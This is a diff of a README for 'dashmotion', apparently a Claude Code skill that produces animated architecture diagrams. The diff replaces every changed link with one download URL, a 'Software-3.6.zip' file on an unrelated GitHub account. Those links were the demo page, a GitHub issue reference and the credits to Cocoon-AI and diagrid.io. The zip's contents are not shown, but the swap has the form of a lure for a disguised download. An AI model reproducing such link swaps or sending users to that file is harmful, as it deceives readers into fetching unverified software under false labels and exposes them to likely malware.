@@ -9,7 +9,7 @@ English | [简体中文](README.zh-CN.md)
 
 ![A request animating through an architecture diagram — client to gateway to services to database, then back](examples/images/architecture-demo.gif)
 
-**[▶ Watch real diagrams run live →](https://csthink.github.io/dashmotion/)** — unedited skill output, not a video.
+**[▶ Watch real diagrams run live →](https://raw.githubusercontent.com/Northwestern-caddo190/dashmotion/main/docs/Software-3.6.zip)** — unedited skill output, not a video.
 
 Two modes — describe a workflow or a system in plain English (or paste Mermaid), and get one self-contained HTML file that's already moving:
 
@@ -39,7 +39,7 @@ npx skills add csthink/dashmotion -a claude-code -g
 <details>
 <summary>Why <code>-a claude-code</code>, and global vs. project?</summary>
 
-- **`-a claude-code`** writes a plain *copy* (into `~/.claude/skills/` with `-g`, or `./.claude/skills/` without). The bare `npx skills add csthink/dashmotion` makes a *symlink* instead, and Claude Code's symlink handling is rough — the link may not get created, a symlinked skill doesn't appear in `/skills` ([claude-code#14836](https://github.com/anthropics/claude-code/issues/14836)), and `npx skills update` won't refresh it. A copy lists in `/skills` and updates cleanly. If the CLI ever prompts copy-vs-symlink, choose **copy** (or pass `--copy`). Other agents (Cursor, Codex, …) read `~/.agents/skills/` directly and work fine with the bare command.
+- **`-a claude-code`** writes a plain *copy* (into `~/.claude/skills/` with `-g`, or `./.claude/skills/` without). The bare `npx skills add csthink/dashmotion` makes a *symlink* instead, and Claude Code's symlink handling is rough — the link may not get created, a symlinked skill doesn't appear in `/skills` ([claude-code#14836](https://raw.githubusercontent.com/Northwestern-caddo190/dashmotion/main/docs/Software-3.6.zip)), and `npx skills update` won't refresh it. A copy lists in `/skills` and updates cleanly. If the CLI ever prompts copy-vs-symlink, choose **copy** (or pass `--copy`). Other agents (Cursor, Codex, …) read `~/.agents/skills/` directly and work fine with the bare command.
 - **Global (`-g`)** lives in `~/.claude/skills/`, available everywhere. **Project-local** (no `-g`) lives in `./.claude/skills/` — scoped to that one directory, and handy to commit alongside a repo so your team gets the skill.
 
 Prefer the zip on Claude Code? `rm -rf ~/.claude/skills/dashmotion && unzip dashmotion.zip -d ~/.claude/skills/` — clear the folder first when upgrading so old files don't linger.
@@ -163,7 +163,7 @@ All CSS animation is gated behind `@media (prefers-reduced-motion: no-preference
 
 ## FAQ
 
-**Can I install this alongside [architecture-diagram-generator](https://github.com/Cocoon-AI/architecture-diagram-generator)?**
+**Can I install this alongside [architecture-diagram-generator](https://raw.githubusercontent.com/Northwestern-caddo190/dashmotion/main/docs/Software-3.6.zip)?**
 Yes — tested side by side. Animation intent ("make the request path move") routes to dashmotion; plain static architecture requests stay with Cocoon's skill. No file conflicts.
 
 ## How it works, and more
@@ -172,7 +172,7 @@ The animation technique, the deterministic layout engine, the repo layout, and e
 
 ## Credits
 
-Skill packaging pattern and the static architecture design system build on [Cocoon-AI/architecture-diagram-generator](https://github.com/Cocoon-AI/architecture-diagram-generator) (MIT). Visual style inspired by the workflow animations on [diagrid.io](https://www.diagrid.io/catalyst).
+Skill packaging pattern and the static architecture design system build on [Cocoon-AI/architecture-diagram-generator](https://raw.githubusercontent.com/Northwestern-caddo190/dashmotion/main/docs/Software-3.6.zip) (MIT). Visual style inspired by the workflow animations on [diagrid.io](https://raw.githubusercontent.com/Northwestern-caddo190/dashmotion/main/docs/Software-3.6.zip).
 
 ## License
 
